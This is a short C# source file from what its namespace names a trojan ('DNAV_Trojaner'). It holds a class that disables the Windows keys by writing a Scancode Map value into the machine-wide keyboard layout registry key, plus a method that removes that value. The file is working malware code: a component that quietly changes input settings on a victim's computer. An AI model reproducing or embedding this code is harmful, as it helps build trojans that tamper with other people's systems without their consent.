using Microsoft.Win32;

namespace DNAV_Trojaner
{
    class WindowsKey
    {
        /// <summary>
        /// Deaktiviert die Windows Taste.
        /// </summary>
        public static void Disable()
        {
            RegistryKey key;

            key = Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Keyboard Layout", true);
            byte[] binary = new byte[] {
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x03,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x5B,
                    0xE0,
                    0x00,
                    0x00,
                    0x5C,
                    0xE0,
                    0x00,
                    0x00,
                    0x00,
                    0x00
                };
            key.SetValue("Scancode Map", binary, RegistryValueKind.Binary);

            key.Close();

        }

         /// <summary>
         /// Aktiviert die Windowstaste.
         /// </summary>
        public static void Enable()
        {
            RegistryKey key;

            key = Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Keyboard Layout", true);
            key.DeleteValue("Scancode Map", true);

            key.Close();

        }
    }
}
